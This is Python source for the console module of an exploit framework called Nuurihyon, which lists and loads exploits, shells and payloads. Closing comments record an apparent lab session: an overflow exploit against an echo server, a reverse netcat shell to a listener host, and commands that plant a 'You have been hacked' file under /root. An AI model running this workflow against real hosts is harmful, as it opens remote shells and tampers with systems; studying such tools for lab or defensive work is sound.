#!/usr/bin/python3

import typing
import readline
import pathlib
from pytoolcore import style, command, engine
from core import blueprintregister, exploitcore
from shinsha import matoi, hata


class Nuurihyon(engine.Engine):
    MODREF: str = "nuurihyon"
    MODNAME: str = "Nuurihyon"
    AUTHOR: str = "Danakane"
    HISTFILE: str = ".history/nuurihyon.hist"
    ROOTDIR: str = str(pathlib.Path(__file__).resolve().parent)
    HISTLEN: int = 1000

    def __init__(self)->None:
        super(Nuurihyon, self).__init__(moduleref=Nuurihyon.MODREF,
                                        modulename=Nuurihyon.MODNAME,
                                        author=Nuurihyon.AUTHOR)

        self.__histlen__: int = 0

        # loading shells, exploits and payloads blueprints
        self.__shellreg__: blueprintregister.ShellRegister = \
            blueprintregister.ShellRegister(Nuurihyon.ROOTDIR + "/shells")
        self.__exploitreg__: blueprintregister.ExploitRegister = \
            blueprintregister.ExploitRegister(Nuurihyon.ROOTDIR + "/exploits")
        self.__payloadreg__: blueprintregister.PayloadRegister = \
            blueprintregister.PayloadRegister(Nuurihyon.ROOTDIR + "/payloads")

        # Defining module's commands
        # load cmd
        cmdload: command.Command = command.Command(cmdname="load", nbpositionals=1,
                                                   completionlist=list(self.__exploitreg__.list))
        loadhelp = "Description : load a given exploit\n" + \
                   "Usage : load {exploit}\n" + \
                   "Note : use 'show exploits' " + \
                   "to display all available modules"
        self.addcmd(cmd=cmdload, fct=self.load, helpstr=loadhelp)

        # show command
        cmdshow: command.Command = command.Command(cmdname="show", nbpositionals=1,
                                                   completionlist=["commands", "name",
                                                                   "author", "options",
                                                                   "payloads", "exploits"])
        showhelp: str = "Description : display option(s), command(s) and attack(s)\n" + \
                        "Usage : show {keyword} \n" + \
                        "Note :\n" + \
                        "\tuse 'show name' to display module's name\n" + \
                        "\tuse 'show author' to display module's author\n" + \
                        "\tuse 'show commands' to display the module's commands\n" + \
                        "\tuse 'show exploits' to display the module's exploits\n" + \
                        "\tuse 'show payloads' to display the available payloads" + \
                        "\tuse 'show options' to display valid keywords\n"
        self.addcmd(cmd=cmdshow, fct=self.show, helpstr=showhelp)

    def show(self, keyword: str)->None:
        keyword = keyword.upper()
        if keyword == "EXPLOITS":
            exploitlist: typing.List[str] = self.__exploitreg__.list
            print(style.Style.info(self.name + "'s exploits"))
            for exploitref in exploitlist:
                print(exploitref)
        elif keyword == "PAYLOADS":
            payloadlist: typing.List[str] = self.__payloadreg__.list
            print(style.Style.info(self.name + "'s payloads"))
            for payloadref in payloadlist:
                print(payloadref)
        else:
            super(Nuurihyon, self).show(keyword)

    def load(self, exploitref: str)->None:
        exploitref = exploitref.lower()
        exploit: exploitcore.Exploit = self.__exploitreg__[exploitref]()
        matoi.Matoi(self.ref, self.name, exploit, self.__shellreg__, self.__payloadreg__).start()

    def start(self):
        try:
            readline.read_history_file(".history/nuurihyon.hist")
            readline.set_history_length(Nuurihyon.HISTLEN)
            self.__histlen__ = readline.get_current_history_length()
        except FileNotFoundError:
            pass
        super(Nuurihyon, self).start()

    def stop(self)->None:
        try:
            readline.append_history_file(readline.get_current_history_length() -
                                         self.__histlen__, Nuurihyon.HISTFILE)
        except FileNotFoundError:
            pass

    def splash(self)->None:
        print(hata.Hata.flag() + " by " + self.author, end="\n\n")


blueprint: typing.Callable = Nuurihyon
name: str = Nuurihyon.MODNAME

if __name__ == '__main__':
    nuurihyon = Nuurihyon()
    nuurihyon.splash()
    nuurihyon.start()
    print(style.Style.info("Otsukaresama desu~ ^(･｡･)ﾉ~~~"))


# load linux_x64_ovrflwmyechosrv
# run payload reverse/linux_netcat rhost 192.168.56.103 rport 1025 lhost 192.168.56.102 lport 4444
# touch /root/hacked.txt
# gnome-terminal -x bash -c "tailf -n 1 /root/hacked.txt"
# echo "You have been hacked :)" >> /root/hacked.txt
